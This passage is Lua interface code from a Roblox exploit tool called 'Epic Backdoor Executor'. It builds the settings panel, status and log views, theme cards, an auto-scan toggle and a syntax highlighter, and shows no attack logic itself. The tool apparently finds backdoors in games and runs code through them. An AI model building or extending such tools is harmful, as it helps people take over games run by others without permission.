Converted["_LogsClearStroke"].Transparency=0
Converted["_LogsClearStroke"].Parent=Converted["_LogsClearBtn"]

Converted["_LogsScroll"].Size=UDim2.new(1,-60,0,150)
Converted["_LogsScroll"].Position=UDim2.new(0,30,0,78)
Converted["_LogsScroll"].BackgroundColor3=Color3.fromRGB(8,8,8)
Converted["_LogsScroll"].BackgroundTransparency=0
Converted["_LogsScroll"].BorderSizePixel=0
Converted["_LogsScroll"].ScrollBarThickness=6
Converted["_LogsScroll"].ScrollBarImageColor3=Color3.fromRGB(180,180,180)
Converted["_LogsScroll"].ScrollingDirection=Enum.ScrollingDirection.Y
Converted["_LogsScroll"].ScrollingEnabled=true
Converted["_LogsScroll"].Active=true
Converted["_LogsScroll"].AutomaticCanvasSize=Enum.AutomaticSize.Y
Converted["_LogsScroll"].CanvasSize=UDim2.new(0,0,0,0)
Converted["_LogsScroll"].Parent=Converted["_SettingsContent"]
Converted["_LogsScrollCorner"].CornerRadius=UDim.new(0,6)
Converted["_LogsScrollCorner"].Parent=Converted["_LogsScroll"]
Converted["_LogsScrollStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_LogsScrollStroke"].Color=Color3.fromRGB(80,80,80)
Converted["_LogsScrollStroke"].Thickness=1
Converted["_LogsScrollStroke"].Transparency=0.4
Converted["_LogsScrollStroke"].Parent=Converted["_LogsScroll"]

local LogsTemplate=Instance.new("TextLabel")
LogsTemplate.Name="LogsTemplate"
LogsTemplate.Size=UDim2.new(1,-8,0,16)
LogsTemplate.BackgroundTransparency=1
LogsTemplate.Text=""
LogsTemplate.TextColor3=Color3.fromRGB(220,220,220)
LogsTemplate.TextSize=12
LogsTemplate.Font=Enum.Font.Code
LogsTemplate.TextXAlignment=Enum.TextXAlignment.Left
LogsTemplate.TextYAlignment=Enum.TextYAlignment.Top
LogsTemplate.TextWrapped=true
LogsTemplate.Visible=false
LogsTemplate.Parent=Converted["_SettingsContent"]

local LogsListLayout=Instance.new("UIListLayout")
LogsListLayout.SortOrder=Enum.SortOrder.LayoutOrder
LogsListLayout.Padding=UDim.new(0,1)
LogsListLayout.Parent=Converted["_LogsScroll"]

Converted["_StatusFrame"].Size=UDim2.new(1,-60,0,60)
Converted["_StatusFrame"].Position=UDim2.new(0,30,0,245)
Converted["_StatusFrame"].BackgroundTransparency=1
Converted["_StatusFrame"].Parent=Converted["_SettingsContent"]
Converted["_StatusFrameCorner"].CornerRadius=UDim.new(0,6)
Converted["_StatusFrameCorner"].Parent=Converted["_StatusFrame"]
Converted["_StatusFrameStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_StatusFrameStroke"].Color=Color3.fromRGB(200,50,50)
Converted["_StatusFrameStroke"].Thickness=1.5
Converted["_StatusFrameStroke"].Transparency=0
Converted["_StatusFrameStroke"].Parent=Converted["_StatusFrame"]
Converted["_StatusTitle"].Size=UDim2.new(1,-12,0,20)
Converted["_StatusTitle"].Position=UDim2.new(0,6,0,4)
Converted["_StatusTitle"].BackgroundTransparency=1
Converted["_StatusTitle"].Text="Status"
Converted["_StatusTitle"].TextColor3=Color3.fromRGB(200,200,200)
Converted["_StatusTitle"].TextSize=12
Converted["_StatusTitle"].Font=Enum.Font.GothamBold
Converted["_StatusTitle"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_StatusTitle"].Parent=Converted["_StatusFrame"]
Converted["_StatusValue"].Size=UDim2.new(1,-12,0,30)
Converted["_StatusValue"].Position=UDim2.new(0,6,0,24)
Converted["_StatusValue"].BackgroundTransparency=1
Converted["_StatusValue"].Text="not found"
Converted["_StatusValue"].TextColor3=Color3.fromRGB(200,50,50)
Converted["_StatusValue"].TextSize=15
Converted["_StatusValue"].Font=Enum.Font.GothamBold
Converted["_StatusValue"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_StatusValue"].TextWrapped=true
Converted["_StatusValue"].TextTruncate=Enum.TextTruncate.AtEnd
Converted["_StatusValue"].Parent=Converted["_StatusFrame"]
Converted["_DeviceLabel"].Size=UDim2.new(1,-24,0,20)
Converted["_DeviceLabel"].Position=UDim2.new(0,30,0,320)
Converted["_DeviceLabel"].BackgroundTransparency=1
Converted["_DeviceLabel"].Text="Device: "..(isMobile and "Mobile"or "PC")
Converted["_DeviceLabel"].TextColor3=Color3.fromRGB(200,200,200)
Converted["_DeviceLabel"].TextSize=13
Converted["_DeviceLabel"].Font=Enum.Font.Gotham
Converted["_DeviceLabel"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_DeviceLabel"].Parent=Converted["_SettingsContent"]
Converted["_ThemeSectionLabel"].Size=UDim2.new(1,-24,0,20)
Converted["_ThemeSectionLabel"].Position=UDim2.new(0,30,0,348)
Converted["_ThemeSectionLabel"].BackgroundTransparency=1
Converted["_ThemeSectionLabel"].Text="UI Theme"
Converted["_ThemeSectionLabel"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_ThemeSectionLabel"].TextSize=14
Converted["_ThemeSectionLabel"].Font=Enum.Font.GothamBold
Converted["_ThemeSectionLabel"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_ThemeSectionLabel"].Parent=Converted["_SettingsContent"]
Converted["_WindowLabel"].Size=UDim2.new(1,-24,0,20)
Converted["_WindowLabel"].Position=UDim2.new(0,30,0,470)
Converted["_WindowLabel"].BackgroundTransparency=1
Converted["_WindowLabel"].Text="Window"
Converted["_WindowLabel"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_WindowLabel"].TextSize=14
Converted["_WindowLabel"].Font=Enum.Font.GothamBold
Converted["_WindowLabel"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_WindowLabel"].Parent=Converted["_SettingsContent"]
Converted["_AotLabel"].Size=UDim2.new(0,150,0,28)
Converted["_AotLabel"].Position=UDim2.new(0,30,0,498)
Converted["_AotLabel"].BackgroundTransparency=1
Converted["_AotLabel"].Text="Always on Top"
Converted["_AotLabel"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_AotLabel"].TextSize=14
Converted["_AotLabel"].Font=Enum.Font.Gotham
Converted["_AotLabel"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_AotLabel"].Parent=Converted["_SettingsContent"]
Converted["_AotToggleBg"].Size=UDim2.new(0,50,0,28)
Converted["_AotToggleBg"].Position=UDim2.new(0,190,0,498)
Converted["_AotToggleBg"].BackgroundColor3=Color3.fromRGB(120,120,120)
Converted["_AotToggleBg"].Text=""
Converted["_AotToggleBg"].BorderSizePixel=0
Converted["_AotToggleBg"].AutoButtonColor=false
Converted["_AotToggleBg"].Parent=Converted["_SettingsContent"]
Converted["_AotBgCorner"].CornerRadius=UDim.new(1,0)
Converted["_AotBgCorner"].Parent=Converted["_AotToggleBg"]
Converted["_AotDot"].Size=UDim2.new(0,22,0,22)
Converted["_AotDot"].Position=UDim2.new(0,3,0.5,-11)
Converted["_AotDot"].BackgroundColor3=Color3.fromRGB(255,255,255)
Converted["_AotDot"].BorderSizePixel=0
Converted["_AotDot"].Parent=Converted["_AotToggleBg"]
Converted["_AotDotCorner"].CornerRadius=UDim.new(1,0)
Converted["_AotDotCorner"].Parent=Converted["_AotDot"]

local AutoScanLabel=Instance.new("TextLabel")
AutoScanLabel.Size=UDim2.new(0,150,0,28)
AutoScanLabel.Position=UDim2.new(0,30,0,535)
AutoScanLabel.BackgroundTransparency=1
AutoScanLabel.Text="Auto Scan on Load"
AutoScanLabel.TextColor3=Color3.fromRGB(255,255,255)
AutoScanLabel.TextSize=14
AutoScanLabel.Font=Enum.Font.Gotham
AutoScanLabel.TextXAlignment=Enum.TextXAlignment.Left
AutoScanLabel.Parent=Converted["_SettingsContent"]

local AutoScanToggleBg=Instance.new("TextButton")
AutoScanToggleBg.Size=UDim2.new(0,50,0,28)
AutoScanToggleBg.Position=UDim2.new(0,190,0,535)
AutoScanToggleBg.BackgroundColor3=Color3.fromRGB(120,120,120)
AutoScanToggleBg.Text=""
AutoScanToggleBg.BorderSizePixel=0
AutoScanToggleBg.AutoButtonColor=false
AutoScanToggleBg.Parent=Converted["_SettingsContent"]

local AutoScanCorner=Instance.new("UICorner")
AutoScanCorner.CornerRadius=UDim.new(1,0)
AutoScanCorner.Parent=AutoScanToggleBg

local AutoScanDot=Instance.new("Frame")
AutoScanDot.Size=UDim2.new(0,22,0,22)
AutoScanDot.Position=UDim2.new(0,3,0.5,-11)
AutoScanDot.BackgroundColor3=Color3.fromRGB(255,255,255)
AutoScanDot.BorderSizePixel=0
AutoScanDot.Parent=AutoScanToggleBg

local AutoScanDotCorner=Instance.new("UICorner")
AutoScanDotCorner.CornerRadius=UDim.new(1,0)
AutoScanDotCorner.Parent=AutoScanDot

local autoScanState = loadAutoScan()
if autoScanState then
	AutoScanDot.Position = UDim2.new(1,-25,0.5,-11)
	AutoScanToggleBg.BackgroundColor3 = Color3.fromRGB(50,205,50)
end

Converted["_AboutLabel"].Size=UDim2.new(1,-24,0,20)
Converted["_AboutLabel"].Position=UDim2.new(0,30,0,670)
Converted["_AboutLabel"].BackgroundTransparency=1
Converted["_AboutLabel"].Text="About"
Converted["_AboutLabel"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_AboutLabel"].TextSize=14
Converted["_AboutLabel"].Font=Enum.Font.GothamBold
Converted["_AboutLabel"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_AboutLabel"].Parent=Converted["_SettingsContent"]
Converted["_VersionLabel"].Size=UDim2.new(1,-24,0,18)
Converted["_VersionLabel"].Position=UDim2.new(0,30,0,695)
Converted["_VersionLabel"].BackgroundTransparency=1
Converted["_VersionLabel"].Text="Epic Backdoor Executor v1.3.9"
Converted["_VersionLabel"].TextColor3=Color3.fromRGB(200,200,200)
Converted["_VersionLabel"].TextSize=13
Converted["_VersionLabel"].Font=Enum.Font.Gotham
Converted["_VersionLabel"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_VersionLabel"].Parent=Converted["_SettingsContent"]
Converted["_DiscordAboutBtn"].Size=UDim2.new(0,240,0,35)
Converted["_DiscordAboutBtn"].Position=UDim2.new(0,30,0,720)
Converted["_DiscordAboutBtn"].BackgroundTransparency=1
Converted["_DiscordAboutBtn"].Text="Discord: discord.gg/cKxRKSsk6C"
Converted["_DiscordAboutBtn"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_DiscordAboutBtn"].TextSize=13
Converted["_DiscordAboutBtn"].Font=Enum.Font.GothamBold
Converted["_DiscordAboutBtn"].AutoButtonColor=false
Converted["_DiscordAboutBtn"].Parent=Converted["_SettingsContent"]
Converted["_DiscordAboutCorner"].CornerRadius=UDim.new(0,6)
Converted["_DiscordAboutCorner"].Parent=Converted["_DiscordAboutBtn"]
Converted["_DiscordAboutStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_DiscordAboutStroke"].Color=Color3.fromRGB(255,255,255)
Converted["_DiscordAboutStroke"].Thickness=1.2
Converted["_DiscordAboutStroke"].Transparency=0
Converted["_DiscordAboutStroke"].Parent=Converted["_DiscordAboutBtn"]
Converted["_BlackThemeCard"].Size=UDim2.new(0,140,0,80)
Converted["_BlackThemeCard"].Position=UDim2.new(0,30,0,376)
Converted["_BlackThemeCard"].BackgroundColor3=Color3.fromRGB(0,0,0)
Converted["_BlackThemeCard"].Text=""
Converted["_BlackThemeCard"].AutoButtonColor=false
Converted["_BlackThemeCard"].BorderSizePixel=0
Converted["_BlackThemeCard"].Parent=Converted["_SettingsContent"]
Converted["_BtcCorner"].CornerRadius=UDim.new(0,6)
Converted["_BtcCorner"].Parent=Converted["_BlackThemeCard"]
Converted["_BtcStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_BtcStroke"].Color=Color3.fromRGB(255,255,255)
Converted["_BtcStroke"].Thickness=2
Converted["_BtcStroke"].Transparency=0
Converted["_BtcStroke"].Parent=Converted["_BlackThemeCard"]
Converted["_Bmt"].Size=UDim2.new(1,0,0,14)
Converted["_Bmt"].BackgroundColor3=Color3.fromRGB(0,0,0)
Converted["_Bmt"].BorderSizePixel=0
Converted["_Bmt"].Parent=Converted["_BlackThemeCard"]
Converted["_BmtCorner"].CornerRadius=UDim.new(0,6)
Converted["_BmtCorner"].Parent=Converted["_Bmt"]
Converted["_Bmd"].Size=UDim2.new(0,5,0,5)
Converted["_Bmd"].Position=UDim2.new(0,4,0.5,-2.5)
Converted["_Bmd"].BackgroundColor3=Color3.fromRGB(255,255,255)
Converted["_Bmd"].BorderSizePixel=0
Converted["_Bmd"].Parent=Converted["_Bmt"]
Converted["_BmdCorner"].CornerRadius=UDim.new(1,0)
Converted["_BmdCorner"].Parent=Converted["_Bmd"]
Converted["_Bmtt"].Size=UDim2.new(1,-12,1,0)
Converted["_Bmtt"].Position=UDim2.new(0,12,0,0)
Converted["_Bmtt"].BackgroundTransparency=1
Converted["_Bmtt"].Text="Black"
Converted["_Bmtt"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_Bmtt"].TextSize=8
Converted["_Bmtt"].Font=Enum.Font.GothamBold
Converted["_Bmtt"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_Bmtt"].Parent=Converted["_Bmt"]
Converted["_Bme"].Size=UDim2.new(1,-16,1,-26)
Converted["_Bme"].Position=UDim2.new(0,8,0,18)
Converted["_Bme"].BackgroundColor3=Color3.fromRGB(0,0,0)
Converted["_Bme"].BorderSizePixel=0
Converted["_Bme"].Parent=Converted["_BlackThemeCard"]
Converted["_BmeCorner"].CornerRadius=UDim.new(0,4)
Converted["_BmeCorner"].Parent=Converted["_Bme"]
Converted["_BmeStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_BmeStroke"].Color=Color3.fromRGB(80,80,80)
Converted["_BmeStroke"].Thickness=1
Converted["_BmeStroke"].Transparency=0.5
Converted["_BmeStroke"].Parent=Converted["_Bme"]
Converted["_Bml1"].Size=UDim2.new(0,20,0,2)
Converted["_Bml1"].Position=UDim2.new(0,4,0,6)
Converted["_Bml1"].BackgroundColor3=Color3.fromRGB(230,200,140)
Converted["_Bml1"].BorderSizePixel=0
Converted["_Bml1"].Parent=Converted["_Bme"]
Converted["_Bml1Corner"].CornerRadius=UDim.new(1,0)
Converted["_Bml1Corner"].Parent=Converted["_Bml1"]
Converted["_Bml2"].Size=UDim2.new(0,30,0,2)
Converted["_Bml2"].Position=UDim2.new(0,4,0,14)
Converted["_Bml2"].BackgroundColor3=Color3.fromRGB(90,150,210)
Converted["_Bml2"].BorderSizePixel=0
Converted["_Bml2"].Parent=Converted["_Bme"]
Converted["_Bml2Corner"].CornerRadius=UDim.new(1,0)
Converted["_Bml2Corner"].Parent=Converted["_Bml2"]
Converted["_Bml3"].Size=UDim2.new(0,14,0,2)
Converted["_Bml3"].Position=UDim2.new(0,4,0,22)
Converted["_Bml3"].BackgroundColor3=Color3.fromRGB(200,120,90)
Converted["_Bml3"].BorderSizePixel=0
Converted["_Bml3"].Parent=Converted["_Bme"]
Converted["_Bml3Corner"].CornerRadius=UDim.new(1,0)
Converted["_Bml3Corner"].Parent=Converted["_Bml3"]
Converted["_Btl"].Size=UDim2.new(1,0,0,14)
Converted["_Btl"].Position=UDim2.new(0,0,1,-14)
Converted["_Btl"].BackgroundTransparency=1
Converted["_Btl"].Text="Black (Active)"
Converted["_Btl"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_Btl"].TextSize=10
Converted["_Btl"].Font=Enum.Font.GothamBold
Converted["_Btl"].Parent=Converted["_BlackThemeCard"]

Converted["_PurpleThemeCard"].Size=UDim2.new(0,140,0,80)
Converted["_PurpleThemeCard"].Position=UDim2.new(0,180,0,376)
Converted["_PurpleThemeCard"].BackgroundColor3=Color3.fromRGB(25,10,40)
Converted["_PurpleThemeCard"].Text=""
Converted["_PurpleThemeCard"].AutoButtonColor=false
Converted["_PurpleThemeCard"].BorderSizePixel=0
Converted["_PurpleThemeCard"].Parent=Converted["_SettingsContent"]
Converted["_PtcCorner"].CornerRadius=UDim.new(0,6)
Converted["_PtcCorner"].Parent=Converted["_PurpleThemeCard"]
Converted["_PtcStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_PtcStroke"].Color=Color3.fromRGB(180,80,255)
Converted["_PtcStroke"].Thickness=2
Converted["_PtcStroke"].Transparency=0
Converted["_PtcStroke"].Parent=Converted["_PurpleThemeCard"]
Converted["_Pmt"].Size=UDim2.new(1,0,0,14)
Converted["_Pmt"].BackgroundColor3=Color3.fromRGB(40,15,60)
Converted["_Pmt"].BorderSizePixel=0
Converted["_Pmt"].Parent=Converted["_PurpleThemeCard"]
Converted["_PmtCorner"].CornerRadius=UDim.new(0,6)
Converted["_PmtCorner"].Parent=Converted["_Pmt"]
Converted["_Pmd"].Size=UDim2.new(0,5,0,5)
Converted["_Pmd"].Position=UDim2.new(0,4,0.5,-2.5)
Converted["_Pmd"].BackgroundColor3=Color3.fromRGB(200,120,255)
Converted["_Pmd"].BorderSizePixel=0
Converted["_Pmd"].Parent=Converted["_Pmt"]
Converted["_PmdCorner"].CornerRadius=UDim.new(1,0)
Converted["_PmdCorner"].Parent=Converted["_Pmd"]
Converted["_Pmtt"].Size=UDim2.new(1,-12,1,0)
Converted["_Pmtt"].Position=UDim2.new(0,12,0,0)
Converted["_Pmtt"].BackgroundTransparency=1
Converted["_Pmtt"].Text="Purple"
Converted["_Pmtt"].TextColor3=Color3.fromRGB(230,200,255)
Converted["_Pmtt"].TextSize=8
Converted["_Pmtt"].Font=Enum.Font.GothamBold
Converted["_Pmtt"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_Pmtt"].Parent=Converted["_Pmt"]
Converted["_Pme"].Size=UDim2.new(1,-16,1,-26)
Converted["_Pme"].Position=UDim2.new(0,8,0,18)
Converted["_Pme"].BackgroundColor3=Color3.fromRGB(15,5,25)
Converted["_Pme"].BorderSizePixel=0
Converted["_Pme"].Parent=Converted["_PurpleThemeCard"]
Converted["_PmeCorner"].CornerRadius=UDim.new(0,4)
Converted["_PmeCorner"].Parent=Converted["_Pme"]
Converted["_PmeStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_PmeStroke"].Color=Color3.fromRGB(100,40,150)
Converted["_PmeStroke"].Thickness=1
Converted["_PmeStroke"].Transparency=0.5
Converted["_PmeStroke"].Parent=Converted["_Pme"]
Converted["_Pml1"].Size=UDim2.new(0,20,0,2)
Converted["_Pml1"].Position=UDim2.new(0,4,0,6)
Converted["_Pml1"].BackgroundColor3=Color3.fromRGB(200,120,255)
Converted["_Pml1"].BorderSizePixel=0
Converted["_Pml1"].Parent=Converted["_Pme"]
Converted["_Pml1Corner"].CornerRadius=UDim.new(1,0)
Converted["_Pml1Corner"].Parent=Converted["_Pml1"]
Converted["_Pml2"].Size=UDim2.new(0,30,0,2)
Converted["_Pml2"].Position=UDim2.new(0,4,0,14)
Converted["_Pml2"].BackgroundColor3=Color3.fromRGB(150,80,220)
Converted["_Pml2"].BorderSizePixel=0
Converted["_Pml2"].Parent=Converted["_Pme"]
Converted["_Pml2Corner"].CornerRadius=UDim.new(1,0)
Converted["_Pml2Corner"].Parent=Converted["_Pml2"]
Converted["_Pml3"].Size=UDim2.new(0,14,0,2)
Converted["_Pml3"].Position=UDim2.new(0,4,0,22)
Converted["_Pml3"].BackgroundColor3=Color3.fromRGB(100,50,180)
Converted["_Pml3"].BorderSizePixel=0
Converted["_Pml3"].Parent=Converted["_Pme"]
Converted["_Pml3Corner"].CornerRadius=UDim.new(1,0)
Converted["_Pml3Corner"].Parent=Converted["_Pml3"]
Converted["_Ptl"].Size=UDim2.new(1,0,0,14)
Converted["_Ptl"].Position=UDim2.new(0,0,1,-14)
Converted["_Ptl"].BackgroundTransparency=1
Converted["_Ptl"].Text="Dark Purple"
Converted["_Ptl"].TextColor3=Color3.fromRGB(230,200,255)
Converted["_Ptl"].TextSize=10
Converted["_Ptl"].Font=Enum.Font.GothamBold
Converted["_Ptl"].Parent=Converted["_PurpleThemeCard"]

local BgSectionLabel=Instance.new("TextLabel")
BgSectionLabel.Size=UDim2.new(1,-24,0,20)
BgSectionLabel.Position=UDim2.new(0,30,0,590)
BgSectionLabel.BackgroundTransparency=1
BgSectionLabel.Text="Background Image"
BgSectionLabel.TextColor3=Color3.fromRGB(255,255,255)
BgSectionLabel.TextSize=14
BgSectionLabel.Font=Enum.Font.GothamBold
BgSectionLabel.TextXAlignment=Enum.TextXAlignment.Left
BgSectionLabel.Parent=Converted["_SettingsContent"]

local BgInputBg=Instance.new("Frame")
BgInputBg.Size=UDim2.new(0,240,0,35)
BgInputBg.Position=UDim2.new(0,30,0,615)
BgInputBg.BackgroundColor3=Color3.fromRGB(20,20,20)
BgInputBg.BorderSizePixel=0
BgInputBg.Parent=Converted["_SettingsContent"]
local BgInputCorner=Instance.new("UICorner");BgInputCorner.CornerRadius=UDim.new(0,6);BgInputCorner.Parent=BgInputBg
local BgInputStroke=Instance.new("UIStroke");BgInputStroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;BgInputStroke.Color=Color3.fromRGB(80,80,80);BgInputStroke.Thickness=1;BgInputStroke.Parent=BgInputBg

local BgInput=Instance.new("TextBox")
BgInput.Size=UDim2.new(1,-16,1,0)
BgInput.Position=UDim2.new(0,8,0,0)
BgInput.BackgroundTransparency=1
BgInput.Text=""
BgInput.PlaceholderText="Asset ID (e.g. 3333333)"
BgInput.PlaceholderColor3=Color3.fromRGB(120,120,120)
BgInput.TextColor3=Color3.fromRGB(255,255,255)
BgInput.TextSize=13
BgInput.Font=Enum.Font.Gotham
BgInput.ClearTextOnFocus=false
BgInput.Parent=BgInputBg

local BgApplyBtn=Instance.new("TextButton")
BgApplyBtn.Size=UDim2.new(0,90,0,35)
BgApplyBtn.Position=UDim2.new(0,280,0,615)
BgApplyBtn.BackgroundColor3=Color3.fromRGB(255,255,255)
BgApplyBtn.Text="APPLY"
BgApplyBtn.TextColor3=Color3.fromRGB(0,0,0)
BgApplyBtn.TextSize=13
BgApplyBtn.Font=Enum.Font.GothamBold
BgApplyBtn.AutoButtonColor=false
BgApplyBtn.BorderSizePixel=0
BgApplyBtn.Parent=Converted["_SettingsContent"]
local BgApplyCorner=Instance.new("UICorner");BgApplyCorner.CornerRadius=UDim.new(0,6);BgApplyCorner.Parent=BgApplyBtn
local BgApplyStroke=Instance.new("UIStroke");BgApplyStroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;BgApplyStroke.Color=Color3.fromRGB(255,255,255);BgApplyStroke.Thickness=1.2;BgApplyStroke.Parent=BgApplyBtn

local BgRemoveBtn=Instance.new("TextButton")
BgRemoveBtn.Size=UDim2.new(0,90,0,35)
BgRemoveBtn.Position=UDim2.new(0,380,0,615)
BgRemoveBtn.BackgroundColor3=Color3.fromRGB(200,50,50)
BgRemoveBtn.Text="REMOVE"
BgRemoveBtn.TextColor3=Color3.fromRGB(255,255,255)
BgRemoveBtn.TextSize=13
BgRemoveBtn.Font=Enum.Font.GothamBold
BgRemoveBtn.AutoButtonColor=false
BgRemoveBtn.BorderSizePixel=0
BgRemoveBtn.Visible=false
BgRemoveBtn.Parent=Converted["_SettingsContent"]
local BgRemoveCorner=Instance.new("UICorner");BgRemoveCorner.CornerRadius=UDim.new(0,6);BgRemoveCorner.Parent=BgRemoveBtn
local BgRemoveStroke=Instance.new("UIStroke");BgRemoveStroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;BgRemoveStroke.Color=Color3.fromRGB(200,50,50);BgRemoveStroke.Thickness=1.2;BgRemoveStroke.Parent=BgRemoveBtn

task.spawn(function()
	task.wait(0.5)
	local textW=Converted["_TitleText"].TextBounds.X
	if textW<10 then textW=200 end
	local gap=isMobile and 18 or 8
	local dotX=56+textW+gap
	if isMobile then
		Converted["_StatusGlow"].Size=UDim2.new(0,24,0,24)
		Converted["_StatusDot"].Size=UDim2.new(0,15,0,15)
		Converted["_StatusGlow"].Position=UDim2.new(0,dotX-6,0.5,-12)
		Converted["_StatusDot"].Position=UDim2.new(0,dotX-1,0.5,-7)
	else
		Converted["_StatusGlow"].Size=UDim2.new(0,20,0,20)
		Converted["_StatusDot"].Size=UDim2.new(0,12,0,12)
		Converted["_StatusGlow"].Position=UDim2.new(0,dotX-4,0.5,-10)
		Converted["_StatusDot"].Position=UDim2.new(0,dotX,0.5,-6)
	end
end)

local PLACEHOLDER_TEXT = "write your code here..."

local hlKeywords = {["and"]=true,["or"]=true,["not"]=true,["if"]=true,["then"]=true,["else"]=true,["elseif"]=true,["end"]=true,["for"]=true,["in"]=true,["do"]=true,["while"]=true,["repeat"]=true,["until"]=true,["function"]=true,["local"]=true,["return"]=true,["break"]=true,["continue"]=true,["goto"]=true,["self"]=true}
local hlFunctions = {["print"]=true,["warn"]=true,["error"]=true,["assert"]=true,["pcall"]=true,["xpcall"]=true,["type"]=true,["select"]=true,["unpack"]=true,["next"]=true,["pairs"]=true,["ipairs"]=true,["tonumber"]=true,["tostring"]=true,["require"]=true,["loadstring"]=true,["getfenv"]=true,["setfenv"]=true,["wait"]=true,["spawn"]=true,["delay"]=true,["tick"]=true,["time"]=true,["new"]=true,["load"]=true,["Instance"]=true,["Vector3"]=true,["CFrame"]=true,["UDim2"]=true,["Enum"]=true,["Color3"]=true,["BrickColor"]=true,["TweenInfo"]=true,["workspace"]=true,["game"]=true,["script"]=true,["math"]=true,["string"]=true,["table"]=true,["coroutine"]=true,["task"]=true,["os"]=true,["utf8"]=true,["bit32"]=true,["debug"]=true,["collectgarbage"]=true,["getgenv"]=true,["getgc"]=true,["UserInputService"]=true,["RunService"]=true,["TweenService"]=true,["SoundService"]=true,["Lighting"]=true,["Players"]=true,["ReplicatedStorage"]=true,["Workspace"]=true,["StarterGui"]=true,["HttpService"]=true,["VirtualUser"]=true}
local hlGlobals = {["_G"]=true,["_VERSION"]=true,["setmetatable"]=true,["getmetatable"]=true,["rawget"]=true,["rawset"]=true,["rawequal"]=true,["rawlen"]=true}
local SOH = string.char(1)
local STX = string.char(2)

local function highlight(text)
	text = text:gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;")
	local protected = {}
	local function protect(html)
		table.insert(protected, html)
		return SOH .. string.rep("#", #protected) .. STX
	end
	text = text:gsub("(%-%-[^\n]*)", function(c) return protect('<font color="#5c6370">' .. c .. '</font>') end)
	text = text:gsub('%[%[(.-)%]%]', function(s) return protect('<font color="#98c379">[[' .. s .. ']]</font>') end)
	text = text:gsub('("..-")', function(s) return protect('<font color="#98c379">' .. s .. '</font>') end)
	text = text:gsub("('..-')", function(s) return protect('<font color="#98c379">' .. s .. '</font>') end)
	text = text:gsub("%f[%w_](0x%x+)%f[%W_]", function(n) return protect('<font color="#d19a66">' .. n .. '</font>') end)
	text = text:gsub("%f[%w_](%d+%.?%d*[eE][%+%-]?%d+)%f[%W_]", function(n) return protect('<font color="#d19a66">' .. n .. '</font>') end)
	text = text:gsub("%f[%w_](%d+%.%d+)%f[%W_]", function(n) return protect('<font color="#d19a66">' .. n .. '</font>') end)
	text = text:gsub("%f[%w_](%d+)%f[%W_]", function(n) return protect('<font color="#d19a66">' .. n .. '</font>') end)
	for _, w in ipairs({"true","false","nil"}) do
		text = text:gsub("%f[%w_]" .. w .. "%f[%W_]", function(x) return protect('<font color="#56b6c2">' .. x .. '</font>') end)
	end
	for kw in pairs(hlKeywords) do
		text = text:gsub("%f[%w_]" .. kw .. "%f[%W_]", function(w) return protect('<font color="#c678dd">' .. w .. '</font>') end)
	end
	for fn in pairs(hlFunctions) do
		text = text:gsub("%f[%w_]" .. fn .. "%f[%W_]", function(w) return protect('<font color="#61afef">' .. w .. '</font>') end)
	end
	for gl in pairs(hlGlobals) do
		text = text:gsub("%f[%w_]" .. gl .. "%f[%W_]", function(w) return protect('<font color="#61afef">' .. w .. '</font>') end)
	end
	text = text:gsub("%f[%w_]([%a_][%w_]*)%f[%W_]", function(w) return protect('<font color="#e6e6e6">' .. w .. '</font>') end)
	text = text:gsub(SOH .. "(#+)" .. STX, function(hashes) return protected[#hashes] or "" end)
	return text
end

local function updateHighlight()
	local raw = Converted["_CodeInput"].Text
	if raw == "" then
		Converted["_Highlighter"].RichText = false
		Converted["_Highlighter"].Text = PLACEHOLDER_TEXT
		Converted["_Highlighter"].TextColor3 = Color3.fromRGB(90,90,90)
	else
		Converted["_Highlighter"].RichText = true
		Converted["_Highlighter"].Text = highlight(raw)
		Converted["_Highlighter"].TextColor3 = Color3.fromRGB(255,255,255)
	end
end

local function updateCodeBox()
	task.wait()
	local text=Converted["_CodeInput"].Text
	if text==""then text=" " end
	local absX=Converted["_CodeInput"].AbsoluteSize.X
	if absX<10 then absX=400 end
	local boundSize=textService:GetTextSize(text,Converted["_CodeInput"].TextSize,Converted["_CodeInput"].Font,Vector2.new(absX,math.huge))
	local height=math.max(boundSize.Y+10,Converted["_CodeFrame"].AbsoluteSize.Y)
	Converted["_CodeInput"].Size=UDim2.new(1,-16,0,height)
	Converted["_Highlighter"].Size=UDim2.new(1,-16,0,height)
	Converted["_ScrollFrame"].CanvasSize=UDim2.new(0,0,0,height)
end

local function switchTab(tabName)
	Converted["_ExecutorContent"].Visible=(tabName=="executor")
	Converted["_ScriptsContent"].Visible=(tabName=="scripts")
	Converted["_SettingsContent"].Visible=(tabName=="settings")
	if tabName=="executor"then Converted["_ActiveBar"].Position=UDim2.new(0,0,0,10)
	elseif tabName=="scripts"then Converted["_ActiveBar"].Position=UDim2.new(0,0,0,58)
	elseif tabName=="settings"then Converted["_ActiveBar"].Position=UDim2.new(0,0,0,106)end
end

local function updateModeButtons()
	local indPos = (execMode=="S") and UDim2.new(0,3,0.5,-13) or UDim2.new(0,37,0.5,-13)
